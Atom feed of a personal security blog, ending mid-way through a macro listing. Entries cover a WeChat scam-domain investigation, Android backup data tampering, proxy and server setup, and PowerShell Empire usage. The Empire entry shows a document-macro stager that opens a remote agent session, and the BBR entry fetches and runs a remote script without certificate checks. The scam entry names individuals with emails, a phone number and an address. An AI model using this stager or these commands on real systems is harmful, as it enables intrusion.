<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xl7dev</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.safebuff.com/"/>
  <updated>2018-10-12T09:48:09.255Z</updated>
  <id>https://blog.safebuff.com/</id>
  
  <author>
    <name>xl7dev</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Free WeChat friend detection platform trap</title>
    <link href="https://blog.safebuff.com/2018/10/12/Free-WeChat-friend-detection-platform-trap/"/>
    <id>https://blog.safebuff.com/2018/10/12/Free-WeChat-friend-detection-platform-trap/</id>
    <published>2018-10-12T07:31:39.000Z</published>
    <updated>2018-10-12T09:48:09.255Z</updated>
    
    <content type="html"><![CDATA[<h3 id="domain"><a href="#domain" class="headerlink" title="domain"></a>domain</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tps.oy54.cn</span><br><span class="line">p1.mug0.cn</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol><li><a href="http://tps.oy54.cn/Login.aspx" target="_blank" rel="noopener">http://tps.oy54.cn/Login.aspx</a></li><li><a href="http://p1.mug0.cn/Login.aspx" target="_blank" rel="noopener">http://p1.mug0.cn/Login.aspx</a></li></ol><p>redirect to</p><table><thead><tr><th>PC UA</th><th>Mobile UA</th></tr></thead><tbody><tr><td><a href="http://main.haidaowx.cn/Login.aspx" target="_blank" rel="noopener">http://main.haidaowx.cn/Login.aspx</a></td><td><a href="http://wx001.ailuquan.cn/index/index/sao?user=35641&amp;type=1" target="_blank" rel="noopener">http://wx001.ailuquan.cn/index/index/sao?user=35641&amp;type=1</a></td></tr></tbody></table><p><img src="Free-WeChat-friend-detection-platform-trap/tps.oy54.cn_response.png" alt="tps_response"><br><img src="Free-WeChat-friend-detection-platform-trap/main.haidaowx.cn.png" alt="haidaowx"><br><img src="Free-WeChat-friend-detection-platform-trap/wx001.ailuquan.cn.png" alt="ailuquan"></p><h3 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h3><h4 id="mug0-cn"><a href="#mug0-cn" class="headerlink" title="mug0.cn"></a>mug0.cn</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">蔡文学/13560062@qq.com</span><br></pre></td></tr></table></figure><h4 id="tps-oy54-cn"><a href="#tps-oy54-cn" class="headerlink" title="tps.oy54.cn"></a>tps.oy54.cn</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">刘洁/13560062@qq.com</span><br></pre></td></tr></table></figure><h4 id="ailuquan-cn"><a href="#ailuquan-cn" class="headerlink" title="ailuquan.cn"></a>ailuquan.cn</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">王焱/3300308307@qq.com</span><br></pre></td></tr></table></figure><h3 id="Search"><a href="#Search" class="headerlink" title="Search"></a>Search</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">domain：3300308307.com</span><br><span class="line">支付宝：3300308307@qq.com==&gt;信阳同城网络科技有限公司</span><br></pre></td></tr></table></figure><h3 id="Qichacha"><a href="#Qichacha" class="headerlink" title="Qichacha"></a>Qichacha</h3><table><thead><tr><th>company</th><th>mobile</th><th>email</th><th>address</th><th>name</th></tr></thead><tbody><tr><td>信阳同城网络科技有限公司</td><td>13033785072</td><td><a href="mailto:itwy88@163.com" target="_blank" rel="noopener">itwy88@163.com</a></td><td>信阳市浉河区中山北路弘运鑫鑫广场写字楼1416号房</td><td>苏阳【微清官方团队】王焱</td></tr></tbody></table><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>此平台通过在手机上发布微信僵尸粉检测来获取用户信息，主要用途: </p><ol><li>投票</li><li>文章访问量</li><li>诈骗</li><li>推广</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;domain&quot;&gt;&lt;a href=&quot;#domain&quot; class=&quot;headerlink&quot; title=&quot;domain&quot;&gt;&lt;/a&gt;domain&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android allowBackup tips</title>
    <link href="https://blog.safebuff.com/2017/06/23/Android-allowBackup-tips/"/>
    <id>https://blog.safebuff.com/2017/06/23/Android-allowBackup-tips/</id>
    <published>2017-06-23T09:54:49.000Z</published>
    <updated>2018-10-12T10:06:50.617Z</updated>
    
    <content type="html"><![CDATA[<p>Android allowBackup tips</p><h3 id="root-device"><a href="#root-device" class="headerlink" title="root device"></a>root device</h3><h4 id="0x01-backup"><a href="#0x01-backup" class="headerlink" title="0x01 backup"></a>0x01 backup</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; adb backup com.example.sharedprefs -f com.example.sharedprefs.ab</span><br></pre></td></tr></table></figure><h4 id="0x02-unpack"><a href="#0x02-unpack" class="headerlink" title="0x02 unpack"></a>0x02 unpack</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; java -jar abe.jar unpack com.example.sharedprefs.ab com.example.sharedprefs.tar</span><br></pre></td></tr></table></figure><h4 id="0x03-tar2ab"><a href="#0x03-tar2ab" class="headerlink" title="0x03 tar2ab"></a>0x03 tar2ab</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; java -jar abe.jar pack com.example.sharedprefs.tar com.example.sharedprefs.ab</span><br></pre></td></tr></table></figure><h4 id="0x04-restore"><a href="#0x04-restore" class="headerlink" title="0x04 restore"></a>0x04 restore</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; adb restore back com.example.sharedprefs.ab</span><br></pre></td></tr></table></figure><p><a href="http://jaist.dl.sourceforge.net/project/adbextractor/abe.jar" target="_blank" rel="noopener">Download abe.jar</a></p><h3 id="not-root-device"><a href="#not-root-device" class="headerlink" title="not root device"></a>not root device</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; adb backup -f com.example.sharedprefs.ab com.example.sharedprefs</span><br><span class="line">&gt; binwalk com.example.sharedprefs.ab</span><br><span class="line">&gt; dd if=com.example.sharedprefs.ab bs=24 skip=1| openssl zlib -d &gt; com.example.sharedprefs.tar</span><br><span class="line">&gt; tar -tf com.example.sharedprefs.tar &gt; com.example.sharedprefs.list</span><br><span class="line">&gt; tar -xf com.example.sharedprefs.tar</span><br><span class="line">&gt; cd apps/com.example.sharedprefs/sp/</span><br><span class="line">&gt; star -c -v -f newbackup.tar -no-dirslash list=com.example.sharedprefs.list</span><br><span class="line">&gt; dd if=com.example.sharedprefs.ab bs=24 count=1 of=newbackup.ab</span><br><span class="line">&gt; openssl zlib -in newbackup.tar &gt;&gt; newbackup.ab</span><br><span class="line">&gt; adb restore newbackup.ab</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Android allowBackup tips&lt;/p&gt;
&lt;h3 id=&quot;root-device&quot;&gt;&lt;a href=&quot;#root-device&quot; class=&quot;headerlink&quot; title=&quot;root device&quot;&gt;&lt;/a&gt;root device&lt;/h3&gt;&lt;h4 i
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Google TCPBBR With Shadowsocksr</title>
    <link href="https://blog.safebuff.com/2017/06/21/Google-TCPBBR-With-Shadowsocksr/"/>
    <id>https://blog.safebuff.com/2017/06/21/Google-TCPBBR-With-Shadowsocksr/</id>
    <published>2017-06-21T09:17:32.000Z</published>
    <updated>2018-10-12T07:36:11.557Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Google-TCPBBR"><a href="#Google-TCPBBR" class="headerlink" title="Google TCPBBR"></a>Google TCPBBR</h4><p>CentOS 6+，Debian 7+，Ubuntu 12+</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.11/linux-headers-4.11.0-041100_4.11.0-041100.201705041534_all.deb</span><br><span class="line">&gt; dpkg -i linux-image-4.*.deb</span><br><span class="line">&gt; update-grub</span><br><span class="line">&gt; reboot</span><br><span class="line">&gt; modprobe tcp_bbr</span><br><span class="line">&gt; echo &quot;tcp_bbr&quot; &gt;&gt; /etc/modules-load.d/modules.conf</span><br><span class="line">&gt; echo &quot;net.core.default_qdisc=fq&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line">&gt; echo &quot;net.ipv4.tcp_congestion_control=bbr&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line">&gt; sysctl -p</span><br><span class="line">&gt; sysctl net.ipv4.tcp_available_congestion_control</span><br><span class="line">&gt; sysctl net.ipv4.tcp_congestion_control</span><br></pre></td></tr></table></figure><p>or quick install via bash script<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget -N --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh &amp;&amp; chmod +x bbr.sh &amp;&amp; bash bbr.sh</span><br><span class="line">&gt; uname -r  # if have 4.9.0 success install</span><br><span class="line">&gt; sysctl net.ipv4.tcp_available_congestion_control</span><br><span class="line">&gt; sysctl net.ipv4.tcp_congestion_control</span><br><span class="line">&gt; sysctl net.core.default_qdisc</span><br><span class="line">&gt; lsmod | grep bbr    # have bbr success install</span><br></pre></td></tr></table></figure></p><h4 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; apt-get install git</span><br><span class="line">&gt; git clone https://github.com/shadowsocksr/shadowsocksr</span><br></pre></td></tr></table></figure><p>Debian / Ubuntu:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; apt-get install git</span><br><span class="line">&gt; git clone https://github.com/shadowsocksr/shadowsocksr.git</span><br></pre></td></tr></table></figure></p><p>CentOS:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; yum install git</span><br><span class="line">&gt; git clone https://github.com/shadowsocksr/shadowsocksr.git</span><br></pre></td></tr></table></figure></p><p>Windows:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; git clone https://github.com/shadowsocksr/shadowsocksr.git</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; cd shadowsocksr &amp;&amp; bash initcfg.sh</span><br><span class="line">&gt; cd ~/shadowsocksr/shadowsocks</span><br><span class="line">&gt; python server.py -p 443 -k password -m aes-128-cfb -O auth_chain_a -o tls1.2_ticket_auth -d start</span><br></pre></td></tr></table></figure><h4 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h4><p>Android APP: <a href="https://github.com/shadowsocksr/shadowsocksr-android/releases" target="_blank" rel="noopener">SSR-android</a></p><p>iOS APP： <a href="https://itunes.apple.com/us/app/shadowrocket/id932747118" target="_blank" rel="noopener">Shadowrocket</a>, <a href="https://itunes.apple.com/app/id1162704202?mt=8" target="_blank" rel="noopener">Potatso2</a></p><p>MAC APP：<a href="https://github.com/shadowsocksr/ShadowsocksX-NG/releases" target="_blank" rel="noopener">ShadowsocksX-NG-R8</a></p><p>其它跨平台分支：<a href="https://github.com/avege/avege" target="_blank" rel="noopener">avege</a>, <a href="https://github.com/erguotou520/electron-ssr" target="_blank" rel="noopener">electron-ssr</a></p><h4 id="Speed-Setting"><a href="#Speed-Setting" class="headerlink" title="Speed Setting"></a>Speed Setting</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; vi /etc/security/limits.conf  # add line to file</span><br><span class="line">*   soft    nofile  512000</span><br><span class="line">*   hard    nofile  1024000</span><br><span class="line">&gt; vi /etc/profile   # add line to file</span><br><span class="line">ulimit -SHn 1024000</span><br><span class="line">&gt; reboot</span><br><span class="line">&gt; ulimit -n     # if return 1024000 success</span><br><span class="line">&gt; vi /etc/sysctl.conf</span><br><span class="line"># turn on TCP Fast Open on both client and server side</span><br><span class="line">net.ipv4.tcp_fastopen = 3</span><br><span class="line">&gt; vi /etc/shadowsocks.json  # edit false to true</span><br><span class="line">&quot;fast_open&quot;: true</span><br><span class="line">&gt; apt-get install python-m2crypto</span><br><span class="line">&gt; pip install M2Crypto --upgrade</span><br><span class="line">&gt; apt-get install python-dev libevent-dev python-setuptools python-gevent</span><br><span class="line">easy_install greenlet gevent</span><br></pre></td></tr></table></figure><p>Docker: <a href="https://hub.docker.com/r/breakwa11/shadowsocksr/" target="_blank" rel="noopener">https://hub.docker.com/r/breakwa11/shadowsocksr/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Google-TCPBBR&quot;&gt;&lt;a href=&quot;#Google-TCPBBR&quot; class=&quot;headerlink&quot; title=&quot;Google TCPBBR&quot;&gt;&lt;/a&gt;Google TCPBBR&lt;/h4&gt;&lt;p&gt;CentOS 6+，Debian 7+，Ubuntu
      
    
    </summary>
    
    
      <category term="Shadowsocksr" scheme="https://blog.safebuff.com/tags/Shadowsocksr/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu16.04.2 network not work</title>
    <link href="https://blog.safebuff.com/2017/05/02/Ubuntu16-04-2-network-not-work/"/>
    <id>https://blog.safebuff.com/2017/05/02/Ubuntu16-04-2-network-not-work/</id>
    <published>2017-05-02T03:52:38.000Z</published>
    <updated>2018-10-12T07:36:11.600Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Create-a-new-template"><a href="#Create-a-new-template" class="headerlink" title="Create a new template"></a>Create a new template</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">右上角网络连接&gt;&gt;编辑连接&gt;&gt;增加&gt;&gt;</span><br><span class="line">以太网 &gt;&gt; 1) 填写连接名称：ethernet</span><br><span class="line">          2) 选择设备</span><br><span class="line">802.1X安全性 &gt;&gt; </span><br><span class="line">1) 勾选对此连接使用802.1X安全配置</span><br><span class="line">2) 认证选择受保护的EAP(PEAP)</span><br><span class="line">3) 勾选不需要CA证书(R)</span><br><span class="line">4) 内部认证&gt;&gt;MSCHAPv2</span><br><span class="line">5) 输入帐号和密码</span><br><span class="line">IPv4 &gt;&gt; 勾选需要IPv4地址完成这个连接</span><br></pre></td></tr></table></figure><h3 id="setting"><a href="#setting" class="headerlink" title="setting"></a>setting</h3><blockquote><p>sudo cat /etc/NetworkManager/system-connections/ethernet</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[connection]</span><br><span class="line">id=ethernet</span><br><span class="line">uuid=9e123fbc-0123-46e3-97b5-f3214e123456</span><br><span class="line">type=ethernet</span><br><span class="line">interface-name=eno1</span><br><span class="line">permissions=</span><br><span class="line">secondaries=</span><br><span class="line"></span><br><span class="line">[ethernet]</span><br><span class="line">duplex=full</span><br><span class="line">mac-address=0A:12:3C:DA:C1:A5</span><br><span class="line">mac-address-blacklist=</span><br><span class="line"></span><br><span class="line">[802-1x]</span><br><span class="line">altsubject-matches=</span><br><span class="line">eap=peap;</span><br><span class="line">identity=username   # replace you login username</span><br><span class="line">password=password   # replace you login password</span><br><span class="line">phase2-altsubject-matches=</span><br><span class="line">phase2-auth=mschapv2</span><br><span class="line">system-ca-certs=true</span><br><span class="line"></span><br><span class="line">[ipv4]</span><br><span class="line">dns-search=</span><br><span class="line">may-fail=false</span><br><span class="line">method=auto</span><br><span class="line"></span><br><span class="line">[ipv6]</span><br><span class="line">addr-gen-mode=stable=privacy</span><br><span class="line">dns-search=</span><br><span class="line">ip6-privacy=0</span><br><span class="line">method=auto</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Create-a-new-template&quot;&gt;&lt;a href=&quot;#Create-a-new-template&quot; class=&quot;headerlink&quot; title=&quot;Create a new template&quot;&gt;&lt;/a&gt;Create a new template&lt;/
      
    
    </summary>
    
    
      <category term="ubuntu" scheme="https://blog.safebuff.com/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>Aria2 Usage</title>
    <link href="https://blog.safebuff.com/2017/04/11/Aria2-Usage/"/>
    <id>https://blog.safebuff.com/2017/04/11/Aria2-Usage/</id>
    <published>2017-04-11T03:07:16.000Z</published>
    <updated>2018-10-12T07:36:11.530Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-Install"><a href="#0x01-Install" class="headerlink" title="0x01 Install"></a>0x01 Install</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; brew install aria2</span><br></pre></td></tr></table></figure><p><a href="https://github.com/acgotaku/BaiduExporter/" target="_blank" rel="noopener">BaiduExporter</a></p><p><a href="https://github.com/acgotaku/115/" target="_blank" rel="noopener">115</a></p><p><a href="https://chrome.google.com/webstore/detail/thunderlixianassistant/eehlmkfpnagoieibahhcghphdbjcdmen?hl=zh-CN" target="_blank" rel="noopener">xunlei</a></p><p><a href="https://github.com/yangshun1029/aria2gui" target="_blank" rel="noopener">aria2gui</a></p><h3 id="0x02-Setting"><a href="#0x02-Setting" class="headerlink" title="0x02 Setting"></a>0x02 Setting</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&gt; mkdir ~/.aria2 &amp;&amp; cd ~/.aria2</span><br><span class="line">&gt; touch aria2.conf</span><br><span class="line">&gt; vi aria2.conf     # add lines to aria2.conf</span><br><span class="line">#用户名</span><br><span class="line">#rpc-user=user</span><br><span class="line">#密码</span><br><span class="line">#rpc-passwd=passwd</span><br><span class="line">#设置加密的密钥</span><br><span class="line">#rpc-secret=secret</span><br><span class="line">#允许rpc</span><br><span class="line">enable-rpc=true</span><br><span class="line">#允许所有来源, web界面跨域权限需要</span><br><span class="line">rpc-allow-origin-all=true</span><br><span class="line">#是否启用https加密，启用之后要设置公钥,私钥的文件路径</span><br><span class="line">#rpc-secure=true</span><br><span class="line">#启用加密设置公钥</span><br><span class="line">#rpc-certificate=/home/name/.config/aria2/example.crt</span><br><span class="line">#启用加密设置私钥</span><br><span class="line">#rpc-private-key=/home/name/.config/aria2/example.key</span><br><span class="line">#允许外部访问，false的话只监听本地端口</span><br><span class="line">rpc-listen-all=false</span><br><span class="line">#RPC端口, 仅当默认端口被占用时修改</span><br><span class="line">#rpc-listen-port=6800</span><br><span class="line">#最大同时下载数(任务数), 路由建议值: 3</span><br><span class="line">max-concurrent-downloads=5</span><br><span class="line">#断点续传</span><br><span class="line">continue=true</span><br><span class="line">#同服务器连接数</span><br><span class="line">max-connection-per-server=5</span><br><span class="line">#最小文件分片大小, 下载线程数上限取决于能分出多少片, 对于小文件重要</span><br><span class="line">min-split-size=10M</span><br><span class="line">#单文件最大线程数, 路由建议值: 5</span><br><span class="line">split=10</span><br><span class="line">#下载速度限制</span><br><span class="line">max-overall-download-limit=0</span><br><span class="line">#单文件速度限制</span><br><span class="line">max-download-limit=0</span><br><span class="line">#上传速度限制</span><br><span class="line">max-overall-upload-limit=0</span><br><span class="line">#单文件速度限制</span><br><span class="line">max-upload-limit=0</span><br><span class="line">#断开速度过慢的连接</span><br><span class="line">#lowest-speed-limit=0</span><br><span class="line">#验证用，需要1.16.1之后的release版本</span><br><span class="line">#referer=*</span><br><span class="line">#文件保存路径, 默认为当前启动位置</span><br><span class="line">dir=/Users/hostname/Downloads</span><br><span class="line">#文件缓存, 使用内置的文件缓存, 如果你不相信Linux内核文件缓存和磁盘内置缓存时使用, 需要1.16及以上版本</span><br><span class="line">#disk-cache=0</span><br><span class="line">#另一种Linux文件缓存方式, 使用前确保您使用的内核支持此选项, 需要1.15及以上版本(?)</span><br><span class="line">#enable-mmap=true</span><br><span class="line">#文件预分配, 能有效降低文件碎片, 提高磁盘性能. 缺点是预分配时间较长</span><br><span class="line">#所需时间 none &lt; falloc ? trunc &lt;&lt; prealloc, falloc和trunc需要文件系统和内核支持</span><br><span class="line">file-allocation=none</span><br><span class="line">#不进行证书校验</span><br><span class="line">check-certificate=false</span><br></pre></td></tr></table></figure><h3 id="0x03-Run"><a href="#0x03-Run" class="headerlink" title="0x03 Run"></a>0x03 Run</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; aria2c    #so open Aria2GUI.app to add file download</span><br><span class="line">or</span><br><span class="line">&gt; aria2c http://www.example.com/test.zip    # download http</span><br><span class="line">&gt; aria2c file1.torrent      # download torrent</span><br><span class="line">&gt; aria2c &quot;magnet:?xt=urn:btih:248D0A1CD08284299DE78D5C1ED359BB46717D8C&amp;dn=aria2&quot;  # download magnet</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-Install&quot;&gt;&lt;a href=&quot;#0x01-Install&quot; class=&quot;headerlink&quot; title=&quot;0x01 Install&quot;&gt;&lt;/a&gt;0x01 Install&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="Aria2" scheme="https://blog.safebuff.com/tags/Aria2/"/>
    
  </entry>
  
  <entry>
    <title>Empire Usage</title>
    <link href="https://blog.safebuff.com/2017/03/25/Empire-Usage/"/>
    <id>https://blog.safebuff.com/2017/03/25/Empire-Usage/</id>
    <published>2017-03-25T15:47:19.000Z</published>
    <updated>2018-10-12T07:36:11.552Z</updated>
    
    <content type="html"><![CDATA[<p><strong>&gt; python empire</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">====================================================================================</span><br><span class="line"> Empire: PowerShell post-exploitation agent | [Version]: 1.6.0</span><br><span class="line">====================================================================================</span><br><span class="line"> [Web]: https://www.PowerShellEmpire.com/ | [Twitter]: @harmj0y, @sixdub, @enigma0x3</span><br><span class="line">====================================================================================</span><br><span class="line"></span><br><span class="line">   _______ .___  ___. .______    __  .______       _______</span><br><span class="line">  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|</span><br><span class="line">  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__</span><br><span class="line">  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|</span><br><span class="line">  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____</span><br><span class="line">  |_______||__|  |__| | _|      |__| | _| `._____||_______|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       180 modules currently loaded</span><br><span class="line"></span><br><span class="line">       1 listeners currently active</span><br><span class="line"></span><br><span class="line">       0 agents currently active</span><br><span class="line"></span><br><span class="line">(Empire) &gt; listeners</span><br><span class="line">[!] No listeners currently active</span><br><span class="line">(Empire: listeners) &gt; execute</span><br><span class="line">(Empire: listeners) &gt; usestager macro test</span><br><span class="line">(Empire: stager/macro) &gt; execute</span><br><span class="line">[*] Stager output written out to: /tmp/macro</span><br><span class="line"></span><br><span class="line">(Empire: stager/macro) &gt; [+] Initial agent 1EBMCTEWVZDNM13U from 192.168.1.205 now active</span><br><span class="line">(Empire: stager/macro) &gt; agents</span><br><span class="line"></span><br><span class="line">[*] Active agents:</span><br><span class="line"></span><br><span class="line">  Name               Internal IP     Machine Name    Username            Process             Delay    Last Seen</span><br><span class="line">  ---------          -----------     ------------    ---------           -------             -----    --------------------</span><br><span class="line">  1EBMCTEWVZDNM13U   192.168.1.205   WIN             *WIN\hello         powershell/4272     5/0.0    2017-03-25 20:27:37</span><br></pre></td></tr></table></figure><p><strong>&gt; cat /tmp/macro</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">Debugging</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Document_Open()</span><br><span class="line">Debugging</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Public Function 